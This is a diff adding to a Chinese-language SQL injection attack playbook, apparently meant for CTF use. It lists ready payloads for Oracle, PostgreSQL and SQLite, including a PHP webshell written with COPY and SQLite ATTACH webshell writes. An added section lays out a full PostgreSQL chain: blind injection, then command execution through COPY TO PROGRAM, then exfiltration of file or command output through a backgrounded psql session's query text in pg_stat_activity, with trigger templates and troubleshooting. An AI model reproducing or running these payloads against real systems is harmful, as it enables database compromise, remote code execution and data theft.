@@ -34,9 +34,61 @@
 
 **Oracle**：dbms_java.grant_permission + Java Runtime｜DBMS_SCHEDULER CREATE_JOB(job_type=>'EXECUTABLE')｜DBMS_JAVA.RUNJAVA｜**UTL_FILE 读文件**（CREATE DIRECTORY + FOPEN/GET_LINE，无 Java 权限时的文件读）｜时间盲 DBMS_PIPE.RECEIVE_MESSAGE('a',5) → DBMS_LOCK.SLEEP → 重查询 all_objects 自乘。
 
-**PostgreSQL**：`COPY (SELECT $$<?php system($_GET['c']); ?>$$) TO '/var/www/html/shell.php'` 写 shell｜COPY tmp FROM 读文件｜**COPY FROM PROGRAM 命令执行**（superuser: `CREATE TABLE cmd_exec(o text); COPY cmd_exec FROM PROGRAM 'id'`）｜COPY TO 导出数据落盘｜lo_import/lo_get 大对象｜PL/pgSQL + sys_exec｜**美元引号** `$$...$$`/`$tag$...$tag$` 绕引号过滤。
+**PostgreSQL**：`COPY (SELECT $$<?php system($_GET['c']); ?>$$) TO '/var/www/html/shell.php'` 写 shell｜COPY tmp FROM 读文件｜**COPY PROGRAM 命令执行**（PG≥11 非 superuser 经 `pg_execute_server_program` 角色：`COPY (SELECT 'x') TO PROGRAM 'id'` 无需目标表/文件权限；`CREATE TABLE ...; COPY ... FROM PROGRAM 'id'` 需写表权限）｜**盲注→RCE→只读库外带完整链路见 §3a**｜COPY TO 导出数据落盘｜lo_import/lo_get 大对象｜PL/pgSQL + sys_exec｜**美元引号** `$$...$$`/`$tag$...$tag$` 绕引号过滤。
 
 **SQLite**：`ATTACH DATABASE '/var/www/html/shell.php' AS pwn; CREATE TABLE pwn.cmd(...); INSERT ...` 写 webshell/crontab｜load_extension(.so/.dll，需编译开关)｜时间盲 `LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`｜错误盲注 `CASE WHEN cond THEN 1 ELSE load_extension(1) END`。
+
+### §3a PostgreSQL：盲注 → COPY TO PROGRAM → 只读库外带
+
+**适用**：布尔/时间盲 SQLi 已确认且引擎为 PostgreSQL；库只读或角色无写权限；当前角色无 `pg_read_server_files`/`pg_write_server_files`，但属于 `pg_execute_server_program` —— 可用原语为 COPY PROGRAM（命令执行 + 把输出经数据库内可见通道盲读回来）。
+
+**1. 输入处理特征自检（先做，影响全部 payload）**
+
+- 输入被整体转小写：`'ZZ'='zz'` 为真、`ascii('A')=65` 为假（实为 `ascii('a')=97`）→ payload 全小写；psql 选项用 `--username=`/`--dbname=` 长选项（`-U` 会被转小写破坏）。
+- 检测：`<闭合>' AND ascii('A')=65-- -`（假=被转小写；`ascii` 不受 collation 影响，为判定锚点）与 `<闭合>' AND 'ZZ'='zz'-- -`（真）交叉印证。
+
+**2. 引擎与能力三查**
+
+- 引擎指纹：`chr(65)`、`quote_ident('a')`、`'5'::int=5`、`'abc'~'b'`、`current_database()` 可求值；`sqlite_version()`/`sqlite_master`/`@@version_comment` 报错 → PostgreSQL。
+- 只读判定：`current_setting('transaction_read_only')='on'` 或 `pg_settings.default_transaction_read_only='on'` → 写表类操作（INSERT/UPDATE/DELETE/CREATE/COPY 入库）全不可用，直接转命令执行+外带（不要先尝试 INSERT/CREATE 路线）；文件读写另受 `pg_read_server_files`/`pg_write_server_files` 角色约束。
+- 角色三查：`pg_has_role(current_user,'pg_read_server_files','member')` / `'pg_write_server_files'` / `'pg_execute_server_program'`。第三项为真即具备 COPY PROGRAM 权限（PG≥11 预定义角色，非 superuser 可用）。
+
+**3. 堆叠语句与命令执行验证**
+
+- 堆叠前提：`<闭合>'; SELECT 'x'; --` 返回应用正常态 → 多语句可用（应用通常取最后一条语句的结果集，末尾补 `SELECT 'x'` 保持返回态）。
+- 执行验证（计时）：`<闭合>'; COPY (SELECT 'x') TO PROGRAM 'sleep 4'; SELECT 'x'; --` 与基线对比，+4s 即执行成功。
+- 权限边界：`COPY (SELECT ...) TO PROGRAM 'cmd'` 只需源查询 SELECT + `pg_execute_server_program`，**不需要文件写权限/目标表**；`COPY ... FROM PROGRAM` 需要向目标表写入（只读/无 INSERT 时不可用）。
+
+**4. 外带载具：psql 会话的 query 文本**
+
+- 载具必须与注入会话**同角色**连接：pg_stat_activity 对非同角色会话隐藏 query 文本（显示 `<insufficient privilege>`、state 为 NULL；读取方无 `pg_read_all_stats` 时）——用默认用户起的 psql 会话读不到内容，表现为"会话不存在"。用注入所用的应用账号连接（本地连接常免密）；读取方可用 `pg_has_role(current_user,'pg_read_all_stats','member')` 自检是否具备跨角色读取权限。
+- 触发模板（后台化让触发请求快速返回；`$(...)` 由 shell 在 psql 启动前替换）：
+
+```bash
+<闭合>'; COPY (SELECT 'x') TO PROGRAM 'nohup psql --username=<app_user> --dbname=<db> -c "select pg_sleep(3600) /* <marker> $(cat /flag.txt 2>/dev/null) */" >/dev/null 2>&1 &'; SELECT 'x'; --
+```
+
+- 原理：内容进入 psql 发送的 SQL 文本 → 常驻 `pg_stat_activity.query`；`pg_sleep` 保活；应用/网关超时只断客户端连接，服务端 psql 会话继续执行。
+- 读取侧（盲 oracle 逐字符）：先 `length()` 探长，再 `substr(query, position('<marker>' in query) + N)` + `ascii()` 二分；行选择必须固定（见下）。
+
+**5. 读取侧三陷阱（判定纪律）**
+
+| 陷阱 | 现象 | 排除 |
+|------|------|------|
+| 自匹配 | 检查请求自身文本含筛选字面量（marker/`%pattern%`）→ 计数/`LIKE` 假阳性 | `pid <> pg_backend_pid()`；并行提取用**行首前缀过滤**（`query LIKE 'select pg_sleep(3600)%'`——注入请求以应用模板开头，永不匹配） |
+| 滞留查询 | 连接池 idle 连接保留最后一条 query 文本 → "存在性"判定命中已完成请求 | 行首前缀 + 固定行：先取 `pid`，后续查询 `WHERE pid=<pid>` |
+| 行漂移 | 子查询每轮重算，提取中途行被替换 → 字符混读 | 固定 `pid`；或 `ORDER BY backend_start DESC LIMIT 1` 容忍同内容多行冗余 |
+
+**6. 命令输出读取（通用）**
+
+- 载具注释放 `$(<任意命令> 2>&1 | head -c <N>)` 即可把任意命令输出带回库内盲读——读文件/环境/工具输出全可用。
+- 对称方向（读其他会话正在执行的 query，需相应可见性权限）：见「增补」节 processlist 竞态泄露条目。
+
+**7. 排错**
+
+- 会话"不存在" → 先查角色可见性（换同角色账号），再查命令是否真的执行（同角色载具交叉验证）。
+- 存在性间歇真假 → 自匹配/行漂移，按 §5 固定行。
+- COPY 无结果集导致应用报错 → 末尾补 `SELECT 'x'`；无权限 → 复核角色三查。
 
 ## 4. INSERT/UPDATE/DELETE + 二阶 + 参数化失效
 
